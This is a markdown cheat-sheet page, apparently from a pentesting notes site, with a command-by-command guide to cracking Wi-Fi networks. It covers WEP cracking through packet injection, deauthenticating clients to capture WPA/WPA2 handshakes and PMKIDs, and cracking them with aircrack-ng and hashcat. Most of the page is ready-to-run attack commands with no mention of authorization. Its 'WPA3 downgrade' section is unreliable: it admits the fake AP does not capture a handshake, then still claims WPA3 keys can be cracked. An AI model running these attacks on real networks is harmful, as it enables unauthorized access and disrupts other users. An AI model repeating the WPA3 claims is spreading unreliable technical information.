---
title: Wireless
layout: page
parent: network
---

# Wireless

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

---

## Setup

### Monitor mode

First off, you need to set up your wifi interface in monitor mode. To do so, you need to know the name of your wifi interface. You can find it by running the following command:

```bash
ip addr
```

This will list all the network interfaces on your system. Look for the one that corresponds to your wifi adapter. It is usually named `wlan0`, `wlan1`, `wlo1` or something similar.
Once you have identified your wifi interface, you can set it to monitor mode using the following commands :

```bash
sudo airmon-ng check kill
sudo airmon-ng start <interface>  # start monitor mode
```

### Network scanning

Now, you can scan for wifi networks using the following command:

```bash
sudo airodump-ng <monitor_interface> #eg wlan0mon
```

This will display a list of all the wifi networks in range, and note the BSSID (MAC address) and channel of the target network.

## WEP cracking

### Capture packets

To crack WEP, you need to capture packets from the target network. You can do this using the following command:

```bash
sudo airodump-ng --channel <channel> --bssid <BSSID> --write <output_file> <monitor_interface>
```

You want a lot of Data packets (not just Beacons).

### Speed up the process

To speed up the process, you can use the following command to inject packets into the network:

```bash
sudo aireplay-ng --fakeauth 0 -a <BSSID> <monitor_interface>
```

This will authenticate you to the network and allow you to capture more packets, then you can use the following command to generate ARP requests:

```bash
sudo aireplay-ng --arpreplay -b <BSSID> <monitor_interface>
```

This will generate a lot of traffic and help you capture more packets.

### Cracking the WEP key

Once you have captured enough packets (at least 50000 IVs, recommended 200000), you can crack the WEP key using the following command:

```bash
aircrack-ng <output_file>
```

This will attempt to crack the WEP key using the captured packets. If successful, it will display the WEP key in the terminal.

## WPA/WPA2 cracking

### Option 1 (easier but slower and less successful)

To crack WPA/WPA2, you need to capture a 4-way handshake. To do so, you have to capture the handshake when a client connects to the network, so start the airodump-ng command to capture packets:

```bash
sudo airodump-ng --channel <channel> --bssid <BSSID> --write <output_file> <monitor_interface>
```

If a client is connected to the network, you will see the handshake in the terminal. If not, you can use the following command to deauthenticate a client and force it to reconnect in another terminal:

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <STATION> <monitor_interface>
```

Once you have captured the handshake, you can crack the WPA/WPA2 key using a wordlist. You can use the following command to crack the key:

```bash
aircrack-ng -w <wordlist> <capture_file>
```

This will attempt to crack the WPA/WPA2 key using the wordlist provided. If successful, it will display the WPA/WPA2 key in the terminal.
Note that if the ESSID is hidden, you will need to use the `-e` option to specify the ESSID when cracking the key.

### Option 2 (harder but faster and more successful)

A way faster and more successful alternative to the previous method is to use `hcxdumptool` to capture the handshake or the PMKID and then crack it with `hashcat`. This makes it more likely to succeed than the previous method since we could only use the handshake with it, and this method allows us to use `hashcat` to crack the hash which is way faster than `aircrack-ng`.

First, we need to do a dump using `tcpdump` :

```bash
sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 <BSSID (eg.aabbccddeeff)> or wlan addr3 ffffffffffff" -ddd > <bpf_output_file>.bpf
```

Then, we can use `hcxdumptool` to capture the handshake or the PMKID, and it is mandatory to add band information to the channel number (e.g. 12a):

- band a: NL80211_BAND_2GHZ
- band b: NL80211_BAND_5GHZ
- band c: NL80211_BAND_6GHZ

Thus, you can use the following command:

```bash
sudo hcxdumptool -i <monitor_interface> -c <channel>[a,b,c] --bpf=<bpf_input_file>.bpf -w <output_capture_file>.pcapng
```

This will create a pcapng file with the captured packets, you need to wait for either the EAPOL handshake symbolized by the '3' or the PMKID symbolized by the 'P' to have a + under them to know that you have captured one of them, allowing you to try to crack the hash.

Now, we need to convert the pcapng file to the specific hash that `hashcat` can use. To do this, we can use the following command:

```bash
hcxpcapngtool -o <output_file>.hc22000 <input_capture_file>.pcapng
```

Finally, we can use `hashcat` to crack the hash. You can use the following command to try to crack the hash using a wordlist and a rule file, but bruteforce is also possible for wireless cracking.

```bash
hashcat -m 22000 -a 0 -o <output_file> -r /tmp/OneRuleToRuleThemStill/OneRuleToRuleThemStill.rule <hash_file>.hc22000 /tmp/wordlists/passwords/most_used_passwords.txt -w 4 --opencl-device-types 1,2 
```

## WPA3 downgrade

Note that this only allows us to shutdown traffic on the network, but not to capture the handshake. To do this, we need to change our approach on the WPA2 AP part.

### Capture packets

To crack WPA3, you need to capture packets from the target network. You can do this using the following command:

```bash
sudo airodump-ng --channel <channel> --bssid <BSSID> <monitor_interface>
```

### Deauthenticate a client

To deauthenticate a client and force it to reconnect, you can use the following command:

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <STATION> <monitor_interface>
```

### Fake a WPA2 AP

To fake a WPA2 AP, you can use the following command:

```bash
sudo airbase-ng -e <SSID> -c <channel> -P -C 30 -Z 4 <monitor_interface>
```

This will create a fake AP with the specified SSID and channel, however, this is not a true WPA2 AP, which does not allow us to capture the handshake. To do this, we need to use a different method. This is the only thing missing to make WPA3 cracking work.

### Option 1 (easier but slower and less successful)

Conceal the WPA3 handshake by capturing it with airodump-ng:

```bash
sudo airodump-ng --channel <channel> --bssid <fake_BSSID> --write <output_file> <monitor_interface>
```

Once you have captured the handshake, you can crack the WPA3 key using a wordlist. You can use the following command to crack the key:

```bash
aircrack-ng -w <wordlist> <capture_file>
```

This will attempt to crack the WPA3 key using the wordlist provided. If successful, it will display the WPA3 key in the terminal.

### Option 2 (harder but faster and more successful)

Same as WPA2, if you need more explanation check this [part](#option-2-harder-but-faster-and-more-successful) of the WPA2 cracking section.

```bash
sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 <fake_BSSID (eg.aabbccddeeff)> or wlan addr3 ffffffffffff" -ddd > <bpf_output_file>.bpf
```

```bash
sudo hcxdumptool -i <monitor_interface> -c <channel>[a,b,c] --bpf=<bpf_input_file>.bpf -w <output_capture_file>.pcapng
```

```bash
hcxpcapngtool -o <output_file>.hc22000 <input_capture_file>.pcapng
```

```bash
hashcat -m 22000 -a 0 -o <output_file> -r /tmp/OneRuleToRuleThemStill/OneRuleToRuleThemStill.rule <hash_file>.hc22000 /tmp/wordlists/passwords/most_used_passwords.txt -w 4 --opencl-device-types 1,2 
```

## Resetting the interface

Once you are done with the cracking, you can reset your wifi interface to its normal mode using the following command:

```bash
sudo airmon-ng stop <monitor_interface>
```

This will stop the monitor mode and reset the interface to its normal mode.
You can also use the following command to restart the network manager:

```bash
sudo systemctl restart NetworkManager
```

This will restart the network manager and allow you to connect to wifi networks again.
If you are using a different network manager, rebooting your system should also work.
